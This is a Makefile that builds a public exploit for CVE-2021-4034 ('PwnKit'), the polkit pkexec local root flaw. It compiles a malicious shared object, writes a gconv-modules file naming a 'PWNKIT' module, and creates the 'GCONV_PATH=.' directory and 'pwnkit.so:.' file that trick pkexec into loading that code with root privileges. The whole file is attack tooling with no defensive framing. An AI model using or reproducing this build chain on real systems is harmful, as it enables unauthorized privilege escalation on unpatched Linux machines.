CFLAGS=-Wall
TRUE=$(shell which true)

.PHONY: all
all: pwnkit.so cve-2021-4034 gconv-modules gconvpath

.PHONY: clean
clean:
	rm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./
	make -C dry-run clean

gconv-modules:
	echo "module UTF-8// PWNKIT// pwnkit 1" > $@

.PHONY: gconvpath
gconvpath:
	mkdir -p GCONV_PATH=.
	cp -f $(TRUE) GCONV_PATH=./pwnkit.so:.

pwnkit.so: pwnkit.c
	$(CC) $(CFLAGS) --shared -fPIC -o $@ $<

.PHONY: dry-run
dry-run:
	make -C dry-run
